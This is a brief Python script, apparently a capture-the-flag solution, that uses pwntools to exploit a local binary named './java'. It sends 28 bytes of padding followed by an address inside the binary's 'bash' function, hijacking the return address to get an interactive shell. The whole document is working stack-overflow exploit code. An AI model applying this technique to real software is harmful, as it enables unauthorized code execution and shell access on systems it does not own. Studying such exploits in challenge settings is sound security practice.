from pwn import *

p = process("./java")
elf = ELF("./java")
p.sendline(b"java" + b"A" * 28 + p64(elf.functions["bash"].address + 0x32))
p.interactive()
